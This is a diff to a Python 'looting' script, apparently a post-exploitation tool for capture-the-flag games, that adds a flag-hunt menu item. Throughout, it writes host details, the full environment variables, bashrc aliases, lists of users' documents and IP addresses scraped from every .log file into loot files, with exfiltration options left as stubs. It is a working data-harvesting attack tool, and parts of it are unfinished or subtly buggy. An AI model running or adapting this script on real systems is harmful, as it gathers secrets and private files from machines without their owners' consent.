@@ -12,15 +12,15 @@ from subprocess import Popen, PIPE
 
 ### Main Menu --start--
 def mainmenu():
-    print('\nforgetmenot looting script\nPlease make a selection.\n   1: Lootme\n   2: Exfil Options\n   3: Compression/ Encryption Options\n   4: Exit')
     try:
         mitem = None
         while mitem != 4:
+            print('\nforgetmenot looting script\nPlease make a selection.\n   1: Lootme\n   2: Exfil Options\n   3: Compression/ Encryption Options\n   4: Flag hunt\n   5: Exit')
             try:
                 mitem = input('fmn_$>')
             except SyntaxError:
                 mitem = None
-            if mitem == 4:      # exit
+            if mitem == 5:      # exit
                 print('Exiting')
                 return
             elif mitem == 1:    # lootme
@@ -29,6 +29,8 @@ def mainmenu():
                 print(2)
             elif mitem == 3:    # compression/ encryption options
                 print(3)
+            elif mitem == 4:    # flag hunt
+                flaghunt()
             else:
                 print("Invalid Selection.")
                 mitem = None
@@ -48,7 +50,7 @@ def lootme_stub():
         print('Running on Linux...')
         lootme_linux()
     elif platform.system() == 'OSX':
-        print('Running on OSX')
+        print('Running on OSX...')
         lootme_osx()
     else:
         print('OS not recognized. Exiting.')
@@ -57,6 +59,22 @@ def lootme_stub():
 
 ### lootme_windows --start--
 def lootme_windows():
+    import winreg
+    if "systemdrive" in os.environ:
+        osroot = os.listdir(os.environ["systemdrive"])
+    if "computername" in os.environ:
+        hostloot = (os.environ["computername"]+"_loot.txt")
+    else:
+        hostloot = ((platform.uname()[1])+"_loot.txt")
+    with open(hostloot, 'w') as outFile:
+        # Dump machine information
+        outFile.write('Machine info:\n')
+        outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
+        # Dump environment variables
+        outFile.write("Environment vars:\n"+str(os.environ)+'\n')
+        
+
+
     return
 ### lootme_windows --end--
 
@@ -65,10 +83,15 @@ def lootme_linux():
     userdirs = os.listdir('/home/')
     hostloot = (platform.uname()[1]+'_loot.txt')
     with open(hostloot, 'w') as outFile:
+        
+        # Dump machine information
         outFile.write('Machine info:\n')
         outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
-        
-        # search user directory files
+        # Dump environment variables
+        outFile.write("Environment vars:\n"+str(os.environ)+'\n')
+
+        # search for bash alias files
+        userfiles = (platform.uname()[1]+'_userFiles.txt')
         for d in userdirs:
             outFile.write('\nUser: '+d+'\n')
             with open(('/home/'+str(d)+'/.bashrc'), 'r') as bashrc:
@@ -78,18 +101,55 @@ def lootme_linux():
                     # search bashrc files for alias designations
                     if re.match('[.]*alias [.]*', line):
                         outFile.write(line)
-            outFile.write('\nFiles discovered:')
             
-            for path, subdirs, files in os.walk('/home/'+d):
-                for name in files:
-                    # search user directories for specified filetypes:
-                    #   pdf, txt, doc(x)
-                    if re.search('[.]*\.pdf', name) or re.search('[.]*\.txt', name) or re.search('[.]*\.doc[.]{1}', name):
-                       outFile.write('\n'+os.path.join(path, name))
-        
-        # search entire OS for files with 'flag' in the name (for CTFs!)
-        print('\nPotential flags found:')
-        outFile.write('\nPotential flags found:')
+        # search for list of user files
+        with open(userfiles, 'w') as ufs:
+            ufs.write('\nFiles discovered:')
+            for d in userdirs:
+                for path, subdirs, files in os.walk('/home/'+d):
+                    for name in files:
+                        # search user directories for specified filetypes:
+                        #   pdf, txt, doc(x)
+                        if re.search('[.]*\.pdf', name) or re.search('[.]*\.txt', name) or re.search('[.]*\.doc[.]{1}', name):
+                            ufs.write('\n'+os.path.join(path, name)+'\n')        
+        # search entire os for .log files, and grab all unique IP addresses
+        unique_ips = [None]
+        for path, subdirs, files in os.walk('/'):
+            for name in files:
+                if re.search('[.]*\.log', name):
+                    #print('log file: ' + name)
+                    try:
+                        with open(os.path.join(path, name), 'r') as logFile:
+                            for line in logFile:
+                                ips = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', line)
+                                if ips is not None:
+                                    for ip in ips:
+                                        if ip not in unique_ips:
+                                            #print(str(ip))
+                                            if unique_ips == [None]:
+                                                unique_ips = [ip]
+                                            else:
+                                                unique_ips.append(ip)
+                    except IOError:
+                        print('IO Error. Likely do not have read permissions.')
+        if unique_ips is not [None]:
+            outFile.write('\nUnique IPs from logs:\n')
+            unique_ips.sort()
+            for ip in unique_ips:
+                outFile.write(str(ip)+'\n')
+    return
+### lootme_linux --end--
+
+### lootme_osx --start--
+def lootme_osx():
+    return
+### lootme_osx --end--
+
+### flag hunt --start--
+def flaghunt():
+    hostflags = (platform.uname()[1]+'_flagFiles.txt')
+    with open(hostflags, 'w') as outFile:
+        outFile.write('Potential flags found:\n')
         for path, subdirs, files in os.walk('/'):
             for name in files:
                 # List of ignored locations and filetypes:
@@ -103,15 +163,9 @@ def lootme_linux():
                 #   *.h
                 #   *.page
                 if re.search('[.]*flag[.]*', name) and not re.search('^/var/lib/', path) and not re.search('^/sys/', path) and not re.search('^/proc/', path) and not re.search('^/usr/src/', path) and not re.search('^/usr/share/help/', path) and not re.search('^/usr/share/man/', path) and not re.search('^/usr/lib/', path) and not re.search('[.]*\.h', name) and not re.search('[.]*\.page', name):
-                    print(os.path.join(path, name))
-                    outFile.write(os.path.join(path, name))
-    return
-### lootme_linux --end--
-
-### lootme_osx --start--
-def lootme_osx():
-    return
-### lootme_osx --end--
+                    #print(os.path.join(path, name))
+                    outFile.write(os.path.join(path, name)+'\n')
+### flag hunt --end--
 
 ### Program init --start--
 mainmenu()
